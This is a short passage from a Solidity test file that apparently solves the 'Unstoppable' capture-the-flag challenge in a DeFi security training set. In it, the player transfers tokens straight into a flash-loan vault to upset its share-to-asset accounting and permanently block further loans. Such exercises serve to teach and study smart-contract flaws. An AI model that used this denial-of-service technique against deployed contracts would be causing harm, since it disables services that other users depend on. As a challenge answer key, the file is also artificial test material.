...
contract UnstoppableChallenge is Test {
    ...
    function test_unstoppable() public checkSolvedByPlayer {
        // by sending it some tokens it cannot accoount for 
        // the assumed rate between shares and assets is unbalanced, bricking subsequent flashloan attempts
        ERC20(address(vault.asset())).transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
    }
